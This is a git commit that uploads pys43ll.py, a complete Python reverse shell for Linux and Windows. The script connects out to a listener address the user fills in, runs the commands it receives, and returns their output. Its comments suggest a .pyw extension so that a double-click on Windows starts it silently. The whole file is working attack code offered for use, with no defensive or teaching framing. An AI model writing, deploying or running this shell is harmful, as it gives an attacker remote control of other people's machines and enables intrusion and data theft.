e21c0010f34285353794e6ba5ced3d6c5d8f123a
Nate <101878955+nathansb2022@users.noreply.github.com>
2022-05-18 17:25:02 -0500

    Add files via upload

---
+++ pys43ll.py
@@ -0,0 +1,73 @@
+#Pys43ll
+#A Python Reverse Shell that can be used on Linux and Windows. The use of Windows requires Python3 installed.
+#On Windows the file can be saved with .pyw to allow a double-click execution.
+#Remember to add the IP address and Port of your choosing.
+
+#Import your modules
+import os
+import sys
+import subprocess
+import socket
+
+#Initialize your variables
+uno = int(1)
+zero = int(0)
+where = str ('cd')
+leave = str ('exit')
+hiz = str("1.1.1.1")#Enter IP where listener is present
+LISNER = 57777 #Enter Port
+B_SIZ= 1024 * 128
+SEP = "<seperationiskey>"
+truth = True
+
+#Creation of Soccy
+soccy = socket.socket()
+
+#Connection
+soccy.connect((hiz, LISNER)) 
+
+#Display the current working directory
+clabordir = str(os.getcwd() + '<pys43ll> ')
+soccy.send(clabordir.encode())
+
+#While loop to keep the shell alive
+while truth:
+
+        info = soccy.recv(B_SIZ).decode()
+        
+        spaceBetween = info.split()
+        
+        if info.lower() == leave:
+        
+            break
+        
+        if spaceBetween[zero].lower() == where:
+        
+            try:
+            
+                os.chdir(' '.join(spaceBetween[uno:]))
+                
+            except FileNotFoundError as e:
+            
+                outward = str(e)
+                
+            else:
+            
+                outward = ""
+                
+        else:
+        
+            outward = subprocess.getoutput(info)
+            
+        clabordir = str(os.getcwd() + '<pys43ll> ')
+        
+        contents = f"{outward}{SEP}{clabordir}"
+        soccy.send(contents.encode())
+
+#Close when finished
+soccy.close()
+
+
+
+
+
